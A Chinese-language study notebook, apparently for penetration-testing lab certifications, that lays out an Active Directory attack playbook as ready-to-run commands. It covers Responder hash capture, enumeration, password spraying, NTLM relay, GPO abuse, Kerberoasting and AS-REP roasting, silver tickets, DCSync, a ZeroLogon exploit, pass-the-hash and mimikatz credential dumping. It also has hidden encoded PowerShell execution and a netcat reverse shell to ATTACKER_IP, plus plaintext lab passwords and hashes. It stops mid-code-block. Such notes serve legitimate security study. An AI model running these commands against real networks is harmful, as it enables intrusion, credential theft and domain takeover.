>[!章節重點]
>AD常用的工具有PowerView、SharpHound、BloodHound、Impacket、Rubeus、mimikatz。
# 內網偵蒐
>[!warning ] 小節重點
>在進入內往後，可能需要先瞭解內網友甚麼東西，比如說主機發現，服務發現等等
- 主要目標
	- AD Users : 列舉有效的使用者以及password spraying
	- AD Joined Computers : Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.
	- Key Services : Kerberos, NetBIOS, LDAP, DNS
	- Vulnerable Hosts and Services : 就漏洞、設定錯誤等等可以利用的方法
## 存活主機列舉手段
>[!warning ]
>希望透過這些手段可以知道，可以知道這個網段裡面有哪些主機在運作

>[!note] 重點
>我們希望透過Layer2(ARP、mDNS)、Layer3(ping)的協定來鎖定內網友那些主機，並透過Namp掃描就可以分析出那臺是AD。
### Wireshark
```shell-session
sudo -E wireshark
```
### Tcpdump
```shell-session
sudo tcpdump -i ens224 
```
```
tcpdump -i eth0 icmp
```
### Responder
```bash
sudo responder -I ens224 -A 
```
### FPing Active Checks
```shell-session
fping -asgq 172.16.5.0/23
```
## 透過Responeder抓取NTLMv2 
如果有網路裡面有`\\print01.inlanefreight.local` ，但是有人打錯成`\\printer01.inlanefreight.local`，電腦會用`LLMNR/NBT-NS`去問整個網路哪裡有`\\printer01.inlanefreight.local`，我們就可以吃到NTLMv2的hash跟帳號。
### Linux版本
- responder
```bash
sudo responder -I ens224 
```
- hashcat
```shell-session
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```
### Windows版本
-  Inveigh :  [點我下載](https://github.com/Kevin-Robertson/Inveigh)
> 這是一個powershell的工具，可以用來收LLMNR收LLMNR等東西，沒有再更新了
```powershell-session
Import-Module .\Inveigh.ps1
```
```powershell-session
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
- C# Inveigh (InveighZero)
```powershell-session
.\Inveigh.exe
```
# 列舉手法
>[!warning] 小節重點
>用內建工具、第三方工具
## 基礎情蒐指令
* 檢查domain user
```
net user /domain
```
- 檢查用戶資訊
```
net user jeffadmin /domain
```
- 檢查domain群組
```
net group /domain
```
- 檢查群組資訊
```
net group "Sales Department" /domain
```
- 檢查AD資訊
``` powershell 
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
## PowerView 基礎情蒐指令
[PowerView 下載點](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* Domain 資訊
``` powershell
Get-NetDomain
```
- 列出domain user
``` powershell
Get-NetUser
```
- 出domain user特定資訊
``` powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```
- 檢查群組資訊 
``` powershell
Get-NetGroup
```
- 檢查電腦資訊
``` powershell
Get-NetComputer | select operatingsystem,dnshostname
```
- 尋找目前的user在整個網域中有沒有有電腦有 administrative permissions
``` powershell
Find-LocalAdminAccess
```
- 檢查user有沒有在其他電腦登入過
``` powershell
Get-NetSession -ComputerName files04 -Verbose 
Get-NetSession -ComputerName web04 -Verbose
```
- 列舉出Server上的SPN
```
setspn -L iis_service
```
``` powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
-  Domain User Information
```powershell-session
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
-  Testing for Local Admin Access
```powershell-session
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```
## SharpView基礎情蒐指令
> .NET版本的powershell，指令幾乎都一樣
- 列舉特定使用者訊息
```powershell-session
.\SharpView.exe Get-DomainUser -Identity forend
```
## Snaffler
>Snaffleris a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
- [點我下載](https://github.com/SnaffCon/Snaffler)
```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```




## 列舉密碼政策(Password Policy)
### crackmapexec 
```shell-session
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
### rpcclient
```shell-session
rpcclient -U "" -N 172.16.5.5
```
```shell-session
rpcclient $> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	RO
```
### enum4linux-ng
```shell-session
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
### PowerView
```powershell-session
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```
## 使用者列舉
>[!warning] 小節重點
>透過SMB Null Session跟LDAP Anonymous列舉
### 透過SMB NULL Session
- enum4linux
```shell-session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
- rpcclient
```shell-session
rpcclient -U "" -N 172.16.5.5
```
```shell-session
rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
```
- CrackMapExec
```shell-session
crackmapexec smb 172.16.5.5 --users
```
``` title:rid-brute
crackmapexec smb 192.168.152.172 -u guest -p "" --rid-brute
```
### Nmap掃描
> vincent 再discord補充
```
nmap -n -sV --script "ldap* and not brute" -p 389 192.168.163.187
```
```
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='access.offsec',userdb=names.txt 192.168.163.187
```
```
nmap -sV --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb='/usr/share/wordlist/userlist.txt' <target ip> -p88
```
### LDAP with cred
```
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```
### LDAP Anonymous
-  ldapsearch
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
```
ldapsearch -x -H ldap://10.10.10.175  -b "dc=Egotistical-bank,dc=local"
```
```
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
```
ldapsearch -x -H ldap://192.168.212.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b "dc=hutch,dc=offsec" "(ms-MCS-AdmPwd=*)"  ms-MCS-AdmPwd
```
- 可以做`|grep description ` 、`|grep sAMAccountName`
- ldapsearch 過濾手法 : 基於尋找特殊的設定
``` bash
cat ldapsearch.out | awk '{print $1}' | sort | uniq -c | sort -nr
```
- windapsearch.py 
[點我下載](https://github.com/ropnop/windapsearch)
```shell-session
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
```
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### 利用Kerbrute列舉使用者
>利用[Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication#top)來運作，速度會比較快
```
./kerbrute_linux_amd64 userenum --dc 10.10.207.146 -d THM-AD userlist.txt
```
```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
```
./kerbrute_linux_amd64 userenum --dc 192.168.1.100 -d domain.local names.txt
```
### 透過已知帳號
>利用已經獲得的帳號以及密碼，進去撈其他使用者資料的手法
```shell-session
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
### 利用Impacket-Get-ADuser
```
impacket-GetADUsers -all -dc-ip 192.168.241.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
```
- 搭配uername.list也有列舉使用者的功能 
[連結](https://tools.thehacker.recipes/impacket/examples/getnpusers.py)
```
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
```
## SPN列舉
>[!解釋]
>假設一個server是user自己在跑的，那這個server就是user自己的user account defines the context，如果這個server是system自記跑的，那就是Service Account，一般來說，大型的Application會有使用Service Account，比如說Exchange Server、MsSQL，而這些Service Account的identifier就是Service Principal Name
- PowerView
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
- setspn.exe
```
setspn.exe -L iis_service
```


## Domain Share列舉
* PowerView 
``` powershell
Find-DomainShare
```
- PowerView
``` powershell
Find-DomainShare -CheckShareAccess
```
- 存取的方法
``` powershell
ls \\DC1.corp.com\SYSVOL\corp.com\Policies\oldpolicy\
```
## CrackMapExec利用
>[!warning] 小節重點
>當取得一組帳號後，可以利用CrackMapExec做橫向擴散的手法。
>這邊假設是forend/Klmcargo2
### 確認主機內有的帳號
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
### 確認主機內有的群組
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
### 確認誰登入過
```shell-session
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
### 查看share folder
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
### 查看folder內的所有資料夾(spider_plus)
```shell-session
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
### Dumping the LAPS Password with crackmapexec
```
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```
## SharpHound
>[!danger ] 重點
>2024/2/20更新: 根本不用打那麼多，打`.\SharpHound.exe`就可以了，打其他的反而輸出會跟人家不一樣。

> 版本要對到，不然就會輸出不了  
- Kali 裡面的位置
```
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```
- SharpHound.ps1蒐集資料的指令
```
. .\SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
```
Invoke-BloodHound -CollectionMethod All
```
- SharpHound.exe 蒐集資料的指令 
```
.\SharpHound.exe --CollectionMethods All
```
###  BloodHound Raw Query
- query session to computer 
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
- query to display all computers
```
MATCH (m:Computer) RETURN m
```
- query to display all users
```
MATCH (m:User) RETURN m
```
- delete all node 
```
match (a) -[r] -> () delete a, r
match (a) delete a
```
### BloodHound.py
>[!warning ] 小節重點
>用python檔直接在kali做sharphound的事情，不需要把sharphound檔案丟過去
- [吉哈伯連結](https://github.com/dirkjanm/BloodHound.py) 
```
/opt/BloodHound/bloodhound.py -d blackfield.local -u support -p '#00^BlackKnight' -g DC01.blackfield.local -c all -ns 10.10.10.192
```
```
/opt/BloodHound/bloodhound.py -d htb.local -u james -p 'J@m3s_P@ssW0rd!' -d htb.local -c all -ns 10.10.10.52
```
# AD的ACL利用
>[!重點]
> ACL是由很多ACE組成的，ACE設定錯誤可以讓使用者或是攻擊者拿到原本不屬於自己的權限，常見的有這三種
> - `ForceChangePassword`
> - `GenericAll`
> - `GenericWrite`

| GenericAll | Full permissions on object |
| ---- | ---- |
| GenericWrite | Edit certain attributes on the object |
| WriteOwner | Change ownership of the object |
| WriteDACL | Edit ACE's applied to object |
| ACE |  |
| AllExtendedRights | Change password, reset password, etc. |
| ForceChangePassword | Password change for object |
| Self (Self-Membership) | Add ourselves to for example a group |
## ACE的列舉手法
>[!warning] 小節重點
>這章利用PowerView作為主要列舉工具
### 利用PowerView列舉單一使用者
>假設我們已經拿到一個使用者`wley`
- Get-DomainObjectACL
```powershell-session
$sid = Convert-NameToSid wley(替換成要列舉的username)
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
- 用-ResolveGUIDs把GUID轉成人看得懂的東西
```powershell-session
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
### 利用Get-ADUser列舉
>這邊想定是PowerView被封鎖，而Get-ADUser是Windows官方的工具，所以可以直接拿來用應該不會被怎樣
- 製作用戶清單
```powershell-session
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
- 透過Get-ADUser列舉
```powershell-session
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
- 列出群組成員ACL
``` powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
- sid轉換成name
``` powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```
## ACE攻擊戰術
>[!danger ] 警告
>這章有夠難先戰術性跳過

# 攻擊手法
## Password Spraying
>[!warning ] 小節重點
>精神在於透過已知的單一密碼，去找到所屬的帳號。
### rpcclient
> valid_users.txt 可以用enum4linux等等工具產出
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
### Spray-Passwords.ps1
```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
### crackmapexec
- Password Spraying with crackmapexec
```
crackmapexec smb 192.168.240.75 -u user.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
-  Local Admin with hash
```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
### kerbrute_windows_amd64.exe
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
### DomainPasswordSpray
>這個東西會自動透過AD建立使用者名單，自動真測密碼，如果加入`-UserList`可以加入自製的wordlist
```powershell-session
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## NTLM Relay Attack
>[!note]
>需要搭配社教工程手法，要受害者點擊到攻擊者的server(各種方法，不一定是http)才可以記錄到ntlm v2
- Ldap ntlm relay attack
``` bash
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```
- LDAP Shell Command
```
write_gpo_dacl** studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
```
add_computer stdx-gpattack Secretpass@123
write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
## GPO Abuse
>[!note]
>需要建立在有對 GPO 的寫入權上面，把惡意命令透過 GPO 部署到網域主機上，其實原理是寫假的GPO檔案，透過file share讓 AD抓，再派送下去。
- GPOddity : https://github.com/synacktiv/GPOddity
``` bash
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```
- `sudo python3 gpoddity.py`  
    以 root 權限執行 GPOddity 的 Python 腳本（需要相應權限與環境）。
- `--gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147'`  
    要操作的 **GPO 的 GUID**（要修改哪個 Group Policy Object）。GPOddity 會嘗試對該 GPO 寫入或注入惡意內容。
- `--domain 'dollarcorp.moneycorp.local'`  
    目標 AD 網域名稱（用來定位 DC、組織單位與 GPO 路徑等）。
- `--username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ'`  
    用來執行操作的帳號／密碼。GPOddity 會用這個身分嘗試對 GPO 做修改——若該帳號在 GPO 的 ACL 上具有 write 權限（或能透過 relay/其他方式取得足夠權限），則可成功修改 GPO。
- `--command 'net localgroup administrators studentx /add'`  
    要放進 GPO（例如 startup script、scheduled task 或其它可執行载入點）的**命令**。目的是在受 GPO 影響的主機上執行該命令，將 `studentx` 加入本機 Administrators。
- `--rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp'`  
    **惡意/rogue SMB 伺服器位址與分享名稱**。GPOddity 會把某些 GPO 檔案或 payload 指向這個 UNC 路徑（例如 `\\172.16.100.x\stdx-gp\...`），或在攻擊流程中以此作為 payload-host。這常在 GPO/Group Policy 文件被建立或引用時被利用。
- `--dc-ip '172.16.2.1'`  
    指定要對哪台 **Domain Controller (DC)** 發出 LDAP/SMB 等操作（即目標 DC 的 IP）。GPO 的修改最後要寫入到 DC 上的 Sysvol/AD 物件，通常會指向 DC。
- `--smb-mode none`  
    指示 GPOddity **不要在本機啟動 SMB server**（也就是不在本地提供 rogue SMB；你可能已經有另一個 SMB host 可用，或不想開本地 SMB listener）。（工具參數在 repo activity/README 有說明）。

因為smbserver開再 stdx-gp，所以要設定file share
``` bash
mkdir /mnt/c/AD/Tools/stdx-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```
``` bash
net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
```
## AS-REP Roasting
- impacket-GetNPUsers
``` bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```
- impacket-GetNPUsers(不用密碼)
```
impacket-GetNPUsers -no-pass -usersfile real_user.txt -dc-ip 10.10.207.146 THM-AD/
```
- Rubeus
```
.\Rubeus.exe asreproast /nowrap
```
- PowerView
```
Get-DomainUser -PreauthNotRequired
```
- hashcat -- 用於爆破產出的密碼
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
## Kerberoasting
>[!warning] 小節重點
>實施Kerberoasting的前提是有以下其中一點
>- domain user credentials (cleartext or just an NTLM hash)
>- SYSTEM account 
>- shell in the context of a domain user

>[!重點]
>Kerberoasting主要攻擊SPN account(SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running)
### 利用PowerView列舉SPN資訊
- 導入powerview
```powershell-session
Import-Module .\PowerView.ps1
```
- 列舉SPN account
```powershell-session
Get-DomainUser * -spn | select samaccountname
```
- 列舉特定SPN account的資訊
```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
```powershell-session
SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769FDC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C0
......
```
### mimikatz 
>利用mimikatz抓取memory抓取裡面殘存的TGS
- 撈取指令
```cmd-session
base64 /out:true
mimikatz # kerberos::list /export
```
- 輸出成base64格式，有利於利用複製貼上到kali做破解，
```shell-session
 echo "doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMII......." |  tr -d \\n 
```
```shell-session
 cat encoded_file | base64 -d > sqldev.kirbi
```
- 透過kirbi2john解析出TGS，可以把輸出存在crack_file檔案裡面(自己建立)
```shell-session
python2.7 kirbi2john.py sqldev.kirbi
```
[kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py)
- 透過指令把格式修改成hashcat可以吃
```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
### impacket-GetUserSPNs
- 用 GetUserSPNs列舉使用者資訊
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
```shell-session
Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain
....
```
- 用GetUserSPNs抓取所有SPN的TGS ticket
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.187.70 corp.com/pete
```
- 用GetUserSPNs抓取單一SPN的TGS ticket
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
- 用GetUserSPNs tested for a quick No-Preauth kerberos win without supplying a username
```
GetNPUsers.py cascade.local/ -dc-ip 10.10.10.182
```
### Rubeus
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
### hashcat -- 用於爆破產出的密碼
```
sudo hashcat -m 13100 kerberos.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
## Silver Tickets
>[!warning] 小節重點
>要製作Silver Ticket需要以下三個條件
>- SPN password hash
>- Domain SID
>- Target SPN

- 可參考本篇打法[Write-Up](https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f)

>需先利用mimikatz找出spn帳號的相關資訊，才可以製作
- mimikatz
```
mimikatz privilege::debug
```
```
mimikatz sekurlsa::logonpasswords
```
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```
- 取得SID
```
whoami /user
```
```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```
- 產出銀票眷
```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
- 檢查
```
PS C:\Tools> klist 
```
- 存取測試
```
iwr -UseDefaultCredentials http://web04
```
## Domain Controller Synchronization
>[!warning ] 小節重點
>當有權限做domain(HTB.local)做DACL (Discretionary Access Control List)的時候(以bloodhound就是WriteDACL)，就可以使用這招。

- mimikatz 
```
lsadump::dcsync /user:corp\dave
```
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
- PowerView 
```
$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\tonee', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tonee -Rights DCSync
```
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "EGOTISTICAL-BANK,DC=local" -PrincipalIdentity svc_loanmgr -Rights DCSync
```
```
impacket-secretsdump htb.local/tonee:password123@10.129.95.210
```

## ZeroLogon
- [檢測用程式](https://github.com/SecuraBV/CVE-2020-1472)
```
./zerologon_tester.py HYDRA-DC 192.168.126.129
```
- [攻擊用程](https://github.com/dirkjanm/CVE-2020-1472)  
```
python cve-2020-1472-exploit.py HYDRA-DC 192.168.126.129 
```
- 打進去就不用密碼了
```
python secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.126.129
```
##  Kerberos Resourced Based Constrained Delegation Attack
>[!warning ] 小節重點
>當在BloodHound發現帳號對DC有Generic All權限時，他可能可以這樣打 
- 利用impacket-addcomputer 建立一個machine帳戶
```
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.241.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
```
- 利用rbcd.py不知道衝三小 
[GitHub連結](https://github.com/tothi/rbcd-attack?source=post_page-----50c25c5a23c5--------------------------------)
```
 /opt/rbcd-attack/rbcd.py -dc-ip 192.168.241.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone  
```
- 利用impacket-getST獲取ticket
```
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.241.175
```
- 為impacket-psexec設定變數
```
export KRB5CCNAME=./Administrator.ccache
```
- 修改`/etc/hosts`
```
sudo sh -c 'echo "192.168.160.175 resourcedc.resourced.local" >> /etc/hosts'
```
- 用Impacket-psexec打進去
```
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.241.175
```
# 橫移手法
## WMI and WinRM
>[!warning] 小節重點
>Windows Management Instrumentation (WMI)可以利用RPC在遠端電腦創建process
- wmic (deprecated)
```
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
>當然要有目標那台的administrators的全組裡面的帳號阿
```
C:\Users\jeff\Desktop>wmic /node:192.168.216.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 5552;
        ReturnValue = 0;
};
```

> 利用powershell執行，需要有遠端的帳號密碼才可以。  

> WinRM只有 Administrators 或是 Remote Management Users group裡面的人才可以使用，也是可以遠端執行程序，WinRM使用5985(encrypt https)及5986(plaintext http)

- WMI
``` powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;


$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e ..........';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
- WinRM
``` powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
winrs.exe -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGw....."
```
- WinRM for Powershell
``` powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.217.73 -Credential $credential
```

``` powershell
Enter-PSSession 1
```
## PsExec
```
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
## Pass The Hash
>[!warning ] 小節解釋
>很多種方法，這邊教impacket-wmiexec
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
## Overpass the Hash
>[!warning ] 小節解釋
>概念就是當本機有殘存他人的帳號跟hash，該帳號又可以登入目標機器，那就可以嘗試用殘存的帳號hash製作TGT來利用

>[!warning ] 小節解釋
>因為user在request TGT的過程中，會需要用key加密timestamp(RC4, AES128 or AES256)，所以在製作時需要注意
### 流程
1. 用mimikatz取得NTLM
2. 用mimikatz製作假票券
### 方法1
```
privilege::debug
sekurlsa::logonpasswords
```
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
### 方法2
``` 
sekurlsa::ekeys
```
```
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
### TryHackMe提供的方法
- 列舉資訊`sekurlsa::ekeys`可以撈出所有key
```shell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
- **If we have the RC4 hash:**
```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
- **If we have the AES128 hash:**
```shell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```
- **If we have the AES256 hash:**
```shell
